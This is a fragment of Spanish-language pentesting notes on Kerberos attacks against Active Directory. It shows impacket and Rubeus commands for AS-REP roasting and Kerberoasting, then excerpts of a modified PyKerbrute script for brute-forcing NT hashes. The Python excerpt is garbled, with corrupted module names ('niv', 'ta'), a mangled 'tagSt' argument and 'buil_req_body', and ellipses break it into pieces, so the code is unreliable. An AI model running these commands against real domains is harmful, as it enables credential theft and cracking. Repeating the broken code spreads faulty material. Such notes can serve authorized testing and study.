...
Teniendo una lista de usuarios válidos podemos intentar un **AS-REP Roast** para intentar conseguir un `hash` de la contraseña del usuario vulnerable para luego crackearla, el comando a seguir es el siguiente:

```shell
impacket-GetNPUsers <DOMINIO>/ -no-pass -usersfile <USUARIOS_VALIDOS> -dc-ip <IP>
```

### Con rubeus

Subimos rubeus a la máquina y ejecutamos:

```powershell
.\Rubeus.exe asreproast /user:<USUARIO> /domain:<DOMINIO> /dc<HOSTNAME>
```
...
A diferencia del **AS-REP Roast**, donde no tenemos credenciales previas, en el **Kerberoasting** necesitamos unas credenciales para realizar el ataque, la sintaxis del comando es la siguiente:
...
```powershell
.\Rubeus.exe kerberoast /creduser:<DOMINIO>\<USUARIO> /credpassword:<CONTRASEÑA>
```

## BruteForce hashes NT

Podemos usar la herramienta [PyKerbrute](https://github.com/3gstudent/pyKerbrute) que nos permite hacer fuerza bruta de múltiples hashes/contraseñas sobre un usuario pero por el protocolo kerberos. De todas formas, no es del todo funcional para este ataque, por lo que tenemos que modificarlo un poco:
...
from pyasn1.type.niv import Integer, Sequence, SequenceOf, OctetString, BitString, Boolean
from pyasn1.type.char import GeneralString
from pyasn1.type.useful import GeneralizedTime
from pyasn1.type.ta import Tag, tagClassContext, tagClassApplication,tagFormatSimple
...
def _v(n, t):
return t.clone(tagSt=t.tagSet + Tag(tagClassContext, tagFormatSimple, n), cloneValueFlag=True)
...
req_body = buil_req_body(target_realm, 'krbtgt', target_realm, nonce, cname=user_name)
...
p1.status("Testing hash %s [%d/2000]" % (hash_ntlm, counter))
